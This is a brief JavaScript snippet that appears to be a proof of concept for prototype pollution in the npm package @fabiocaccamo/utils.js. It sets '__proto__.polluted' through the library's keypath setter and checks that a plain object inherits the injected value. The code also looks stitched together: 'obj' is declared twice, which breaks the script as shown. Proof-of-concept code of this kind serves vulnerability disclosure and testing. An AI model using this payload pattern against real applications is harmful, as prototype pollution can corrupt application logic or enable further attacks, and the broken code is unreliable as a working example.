var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const utils = require('@fabiocaccamo/utils.js');
const obj = {};
console.log({}.polluted);
utils.object.keypath.set(obj, '__proto__.polluted', 'yes');
console.log({}.polluted);